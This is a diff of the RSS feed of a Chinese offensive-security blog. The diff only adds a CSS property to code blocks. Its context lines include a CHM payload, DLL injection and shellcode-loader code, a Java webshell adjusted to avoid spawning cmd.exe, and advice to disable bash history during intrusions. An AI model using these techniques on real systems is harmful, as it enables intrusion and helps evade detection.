style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache &lt;span style="color:#f92672"&gt;-&lt;/span&gt;Djava.io.tmpdir&lt;span style="color:#f92672"&gt;=/&lt;/span&gt;home&lt;span style="color:#f92672"&gt;/&lt;/span&gt;leagsoft&lt;span style="color:#f92672"&gt;/&lt;/span&gt;SafeDataExchange&lt;span style="color:#f92672"&gt;/&lt;/span&gt;Apache&lt;span style="color:#f92672"&gt;/&lt;/span&gt;temp org.apache.catalina.startup.Bootstrap start
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;/home/leagsoft/SafeDataExchange/Apache&lt;/code&gt; 是Tomcat的安装目录，webapps目录下是部署的应用源代码：&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://images.payloads.online/2024-07-29-7eb327a2b65b78ef6312f8ec7ee9a588095d75c22e7b6c0b376fe5954b4cb50d.png" data-fancybox="gallery" data-caption="2"&gt;
  &lt;img src="https://images.payloads.online/2024-07-29-7eb327a2b65b78ef6312f8ec7ee9a588095d75c22e7b6c0b376fe5954b4cb50d.png" alt="2" /&gt;
@@ -575,14 +575,14 @@ nameserver 8.8.8.8
 &lt;/p&gt;
 &lt;h2 id="chm的payload"&gt;CHM的Payload&lt;/h2&gt;
 &lt;p&gt;CHM文件可以通过hh.exe进行反编译：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hh.exe -decompile %temp% payload.chm
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hh.exe -decompile %temp% payload.chm
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="如何构建chm文件"&gt;如何构建CHM文件？&lt;/h3&gt;
 &lt;p&gt;可以使用&lt;code&gt;Microsoft HTML Help Workshop&lt;/code&gt;工具创建CHM文件，FILES指的是目录，OPTIONS指的是文档基本信息：&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://images.payloads.online/2024-07-29-46f7eb69f2f9cfa3972058713818f15955e891fb99252bae45c6209f88a87e69.png" data-fancybox="gallery" data-caption="2"&gt;
  &lt;img src="https://images.payloads.online/2024-07-29-46f7eb69f2f9cfa3972058713818f15955e891fb99252bae45c6209f88a87e69.png" alt="2" /&gt;
 &lt;/a&gt;
 &lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;html&lt;/span&gt;&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;html&lt;/span&gt;&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &amp;lt;&lt;span style="color:#f92672"&gt;head&lt;/span&gt;&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;OBJECT&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;id&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;Test&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;type&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;application/x-oleobject&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;classid&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;clsid:52a2aaae-085d-4187-97ea-8c30db990436&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;codebase&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;hhctrl.ocx#Version=5,02,3790,1194&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;width&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;height&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;PARAM&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;name&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;Command&amp;#34;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;value&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;ShortCut&amp;#34;&lt;/span&gt;&amp;gt;
@@ -623,7 +623,7 @@ nameserver 8.8.8.8
 &lt;blockquote&gt;
 &lt;p&gt;路径：&lt;code&gt;C:\Users\Administrator\.vscode\extensions\ms-python.python-2022.20.2\pythonFiles\lib\python\debugpy\_vendored\pydevd\pydevd_attach_to_process\windows&lt;/code&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// inject_dll.cpp
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// inject_dll.cpp
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
@@ -779,7 +779,7 @@ nameserver 8.8.8.8
 &lt;li&gt;弱口令扫描：低频、小字典、优先尝试SSH/RDP/MySQL/MSSQL等弱口令（分两类：有数据的服务器、有管理端口的服务器）&lt;/li&gt;
 &lt;li&gt;登录Linux服务器，应当避免Bash History被记录可使用sh来执行命令，或设置环境变量避免Bash记录历史命令。&lt;/li&gt;
 &lt;/ul&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python -c &lt;span style="color:#e6db74"&gt;&amp;#39;import pty;pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;python -c &lt;span style="color:#e6db74"&gt;&amp;#39;import pty;pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# or&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; 
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;export HISTFILE&lt;span style="color:#f92672"&gt;=&lt;/span&gt;/dev/null; 
@@ -858,7 +858,7 @@ nameserver 8.8.8.8
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;p&gt;在Before build script中输入如下命令，会在开始编译之前去下载这个项目所依赖的库：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nuget restore
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nuget restore
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;aside&gt;
 💡 "nuget restore" 是NuGet命令行工具中的一个命令。它用于还原（restore）一个项目（project）所依赖的所有NuGet包（NuGet packages）。
 &lt;p&gt;在开发.NET应用程序时，通常会使用NuGet来管理项目所依赖的第三方库和组件。NuGet是.NET生态系统中最受欢迎的包管理器之一，它提供了一个中央存储库，开发人员可以从中获取各种软件包和库。&lt;/p&gt;
@@ -1068,7 +1068,7 @@ nameserver 8.8.8.8
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;p&gt;在跟进到它的&lt;a href="https://github.com/x64dbg/x64dbg/blob/development/src/loaddll/loaddll.cpp"&gt;源代码&lt;/a&gt;：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-cpp" data-lang="cpp"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;wchar_t&lt;/span&gt; szLibraryPath[&lt;span style="color:#ae81ff"&gt;512&lt;/span&gt;];
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -1100,7 +1100,7 @@ nameserver 8.8.8.8
 &lt;li&gt;将loaddll.exe进程的线程从挂起状态恢复成运行状态&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Invoke-Loader测试代码：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;sddl.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -1193,7 +1193,7 @@ nameserver 8.8.8.8
 &lt;/p&gt;
 &lt;p&gt;达到了同样的目的，但是没有创建&lt;code&gt;cmd.exe&lt;/code&gt; ，为了体验上的考量现在的大部分Webshell管理工具执行命令都是要创建cmd.exe的，那么如何让我们的操作都不创建&lt;code&gt;cmd.exe&lt;/code&gt;呢？&lt;/p&gt;
 &lt;p&gt;其实只需要改一下原来的小马即可：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(String&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; args) {
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(String&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; args) {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt; {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;				&lt;span style="color:#75715e"&gt;// String cmdStr = &amp;#34;cmd.exe /c forfiles.exe /p C:\\&amp;#34; ;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; String cmdStr &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;forfiles.exe /p C:\\&amp;#34;&lt;/span&gt; ;
@@ -1240,7 +1240,7 @@ nameserver 8.8.8.8
 &lt;p&gt;假设Kali Linux具有192.168.117.0/24网段内的通用口令凭据，只有Windows 10可以访问互联网，那么常规的办法就是逐个让这些机器访问某个互联网地址，然后看哪一个请求成功了，最终请求成功的那个必定是可以访问互联网的。通过常规办法会有比较大的“动静”，也可能需要落地一些文件，产生更多的日志。&lt;/p&gt;
 &lt;h2 id="0x02-通过rpcopenprinter作为代理访问"&gt;0x02 通过&lt;strong&gt;&lt;strong&gt;RpcOpenPrinter作为代理访问&lt;/strong&gt;&lt;/strong&gt;&lt;/h2&gt;
 &lt;p&gt;&lt;a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/989357e2-446e-4872-bb38-1dce21e1313f"&gt;RpcOpenPrinter&lt;/a&gt; 是一个工作在&lt;a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1"&gt;MS-RPRN&lt;/a&gt;协议下的监视打印机的句柄方法，方法定义如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DWORD &lt;span style="color:#a6e22e"&gt;RpcOpenPrinter&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;DWORD &lt;span style="color:#a6e22e"&gt;RpcOpenPrinter&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [in, string, unique] STRING_HANDLE pPrinterName,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [out] PRINTER_HANDLE&lt;span style="color:#f92672"&gt;*&lt;/span&gt; pHandle,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; [in, string, unique] &lt;span style="color:#66d9ef"&gt;wchar_t&lt;/span&gt;&lt;span style="color:#f92672"&gt;*&lt;/span&gt; pDatatype,
@@ -1322,7 +1322,7 @@ Start:
  mov eax,10
  int 3
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过nasm编译：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nasm &lt;span style="color:#f92672"&gt;-&lt;/span&gt;f obj win.&lt;span style="color:#66d9ef"&gt;asm&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;#&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;生成目标文件&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nasm &lt;span style="color:#f92672"&gt;-&lt;/span&gt;f obj win.&lt;span style="color:#66d9ef"&gt;asm&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;#&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;生成目标文件&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nasm &lt;span style="color:#f92672"&gt;-&lt;/span&gt;f win32 win.&lt;span style="color:#66d9ef"&gt;asm&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;#&lt;/span&gt; &lt;span style="color:#960050;background-color:#1e0010"&gt;如果要采用&lt;/span&gt;VS自带的链接器&lt;span style="color:#960050;background-color:#1e0010"&gt;，就使用&lt;/span&gt;win32格式&lt;span style="color:#960050;background-color:#1e0010"&gt;。&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href="https://images.payloads.online/2022-02-16-17-27-19.png" data-fancybox="gallery" data-caption=""&gt;
  &lt;img src="https://images.payloads.online/2022-02-16-17-27-19.png" alt="" /&gt;
@@ -1351,7 +1351,7 @@ Start:
 &lt;h2 id="0x03-shellcode的通用编写思路"&gt;0x03 Shellcode的通用编写思路&lt;/h2&gt;
 &lt;p&gt;大部分通用的Shellcode编写思路都是从FS寄存器去寻找PEB，然后遍历PEB中的模块列表，从模块列表中寻找Kernel32.dll和ntdll.dll的基址，最终不断从模块中找到API的地址进行调用。&lt;/p&gt;</description></item><item><title>某系统 - Java Filter内部反射功能完成远程代码执行</title><link>https://payloads.online/archivers/2021-12-01/1/</link><pubDate>Wed, 01 Dec 2021 00:37:56 +0800</pubDate><guid>https://payloads.online/archivers/2021-12-01/1/</guid><description>&lt;h2 id="0x00-java-servlet-api-之-filter"&gt;0x00 Java Servlet API 之 Filter&lt;/h2&gt;
 &lt;p&gt;Filter，字面意思有过滤的意思，其实在Servlet API中，它就是充当了一个过滤器，2000年，Sun公司在Servlet 2.3规范中添加了Filter功能，并在Servlet 2.4中对Filter进行了细节上的补充。每一个Java Servlet Web都可以设置多个Filter，开发人员可以通过&lt;code&gt;web.xml&lt;/code&gt;配置Filter的过滤范围。Filter的实现主要通过Servlet API中提供的Filter接口定义的方法，其实就三个方法。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;interface&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Filter&lt;/span&gt; {
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;interface&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Filter&lt;/span&gt; {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;init&lt;/span&gt;(FilterConfig var1) &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; ServletException;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 对Filter进行初始化，可以通过FilterConfig对象读取web.xml中的&amp;lt;init-param&amp;gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// init只会在Web服务启动时执行1次&lt;/span&gt;
@@ -1365,7 +1365,7 @@ Start:
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="0x01-filter中的filterchain"&gt;0x01 Filter中的FilterChain&lt;/h2&gt;
 &lt;p&gt;通常开发人员会使用&lt;code&gt;web.xml&lt;/code&gt;来配置当前站点的各种信息，例如：Servlet、Filter、Listener、显示名称、描述&amp;hellip;等其他信息，关于web.xml的格式定义，oracle官方有一个&lt;a href="https://docs.oracle.com/cd/E13222_01/wls/docs81/webapp/web_xml.html"&gt;非常详细的说明&lt;/a&gt;。&lt;/p&gt;
 &lt;p&gt;假设漏洞环境中的web.xml定义了分别有&lt;code&gt;LoaderFilter&lt;/code&gt;、&lt;code&gt;StaticFilter&lt;/code&gt;，都在&lt;code&gt;com.web.&lt;/code&gt;包下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!DOCTYPE web-app PUBLIC
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!DOCTYPE web-app PUBLIC
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; &amp;#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&amp;#34;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt; &amp;#34;http://java.sun.com/dtd/web-app_2_3.dtd&amp;#34; &amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -1407,7 +1407,7 @@ Start:
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;p&gt;以下示例创建一个每五分钟（300 秒）运行一次的作业：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-xml" data-lang="xml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;plist&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;version=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;dict&amp;gt;&lt;/span&gt;
@@ -1444,7 +1444,7 @@ Start:
 &lt;/ul&gt;
 &lt;p&gt;StartCalendarInterval可以按照如下格式制定周期：&lt;/p&gt;</description></item><item><title>BeingDebugged反调试技巧</title><link>https://payloads.online/archivers/2021-09-13/1/</link><pubDate>Mon, 13 Sep 2021 10:10:08 +0800</pubDate><guid>https://payloads.online/archivers/2021-09-13/1/</guid><description>&lt;h2 id="0x01-windows-pebprocess-environment-block"&gt;0x01 Windows PEB(Process Environment Block)&lt;/h2&gt;
 &lt;p&gt;Windows &lt;a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb"&gt;PEB&lt;/a&gt;，中文的含义是进程环境块，意味着其中包含了很多与进程相关的复杂信息。微软官方给出了Windows PEB的结构体标准，每一个字段都代表了特定的意义。&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;typedef&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;struct&lt;/span&gt; _PEB {
